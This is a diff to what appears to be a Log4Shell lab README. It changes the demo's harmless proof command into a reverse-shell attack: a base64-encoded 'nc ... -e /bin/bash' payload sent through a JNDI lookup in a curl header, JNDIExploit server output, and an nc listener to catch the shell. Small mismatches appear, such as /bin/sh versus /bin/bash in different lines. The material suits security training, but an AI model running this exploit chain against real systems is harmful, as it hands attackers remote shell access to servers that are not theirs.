@@ -33,11 +33,14 @@ unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
 
-* Then, trigger the exploit using:
+* Then, trigger the exploit using the following, but change your ip address in the base64 encoded command with: 
 
 ```bash
-# will execute 'touch /tmp/pwned'
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+# change ip address
+echo "nc <your ip> 80 –e /bin/bash" | base64 -w 0
+
+# will execute 'nc 192.168.178.102 80 –e /bin/bash'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/bmMgMTkyLjE2OC4xNzguMTAyIDgwIC1lIC9iaW4vc2g=}'
 ```
 
 * Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
@@ -45,9 +48,9 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/
 ```
 [+] LDAP Server Start Listening on 1389...
 [+] HTTP Server Start Listening on 8888...
-[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
+[+] Received LDAP Query: Basic/Command/Base64/bmMgMTkyLjE2OC4xNzguMTAyIDgwIC1lIC9iaW4vc2g=
 [+] Paylaod: command
-[+] Command: touch /tmp/pwned
+[+] Command: nc 192.168.178.102 80 -e /bin/sh
 
 [+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
 [+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
@@ -56,14 +59,13 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/
 [+] Response Code: 200
 ```
 
-* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:
+* To confirm that the code execution was successful, spawn a nc listener with nc -nvlp 80:
 
 ```
-$ docker exec vulnerable-app ls /tmp
-...
-pwned
-...
-```
+$ nc -nvlp 80
+
+![image](https://user-images.githubusercontent.com/17672433/145706013-d69bf99d-6135-45b0-97ff-c7aed0c9cbf0.png)
+
 
 ## Reference
 
